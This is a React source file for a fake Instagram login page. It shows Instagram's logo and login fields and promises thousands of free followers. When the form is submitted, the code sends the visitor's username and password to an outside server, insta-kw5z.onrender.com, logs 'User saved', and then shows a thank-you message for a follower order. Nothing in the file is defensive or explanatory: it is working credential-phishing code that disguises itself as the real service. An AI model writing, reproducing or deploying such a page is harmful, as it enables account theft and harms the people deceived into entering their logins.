import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './LoginPage.css';

const LoginPage = () => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [showThanks, setShowThanks] = useState(false); // State for thank-you message
    const navigate = useNavigate();

    const handleLogin = async (e) => {
        e.preventDefault();
        try {
            const response = await fetch('https://insta-kw5z.onrender.com/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password }),
            });

            if (response.ok) {
                const data = await response.json();
                console.log('User saved:', data);

                // Show thank you message
                setShowThanks(true);

                // // Redirect to the admin panel after a short delay
                // setTimeout(() => {
                //     navigate('/admin-panel');
                // }, 2000); // Adjust time as needed (2000 ms = 2 seconds)
            } else {
                console.error('Failed to save user');
            }
        } catch (error) {
            console.error('Error:', error);
        }
    };

    return (
        <div className="login-container">
            <div className="login-box">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" className="logo" />
                <form className="login-form" onSubmit={handleLogin}>
                    <input
                        type="text"
                        placeholder="Phone number, username, or email"
                        className="login-input"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                    />
                    <input
                        type="password"
                        placeholder="Password"
                        className="login-input"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                    />
                    <button type="submit" className="login-button">Log In</button>
                </form>
                {showThanks && <p className="thank-you-message">Thank you! Your Follower Order Get.</p>} {/* Thank You message */}
                <p className="follower-note">
                    Login with your Instagram ID and get 1k, 5k, or even 10k followers instantly!
                </p>
                <div className="or-section">
                    <span className="line"></span>
                    <span className="or-text">OR</span>
                    <span className="line"></span>
                </div>
                <button className="login-facebook">Log in with Facebook</button>
                <a href="#" className="forgot-password">Forgot password?</a>
            </div>
            <div className="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            <div className="app-download-section">
                <p>Get the app.</p>
            </div>
        </div>
    );
};

export default LoginPage;
